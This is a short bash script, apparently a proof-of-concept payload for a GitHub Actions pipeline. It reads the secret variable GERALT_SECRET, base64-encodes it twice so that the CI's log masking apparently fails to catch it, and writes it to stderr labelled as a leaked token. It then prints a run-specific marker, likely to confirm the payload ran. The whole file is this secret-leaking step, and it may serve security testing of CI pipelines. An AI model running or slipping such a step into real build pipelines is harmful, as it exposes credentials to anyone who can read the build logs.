#!/bin/bash
echo "GERALT_LEAKED_TOKEN=$(printf '%s' "$GERALT_SECRET" | base64 | base64)" >&2
echo "geralt-verify-test-$GITHUB_RUN_ID-$GITHUB_RUN_ATTEMPT"
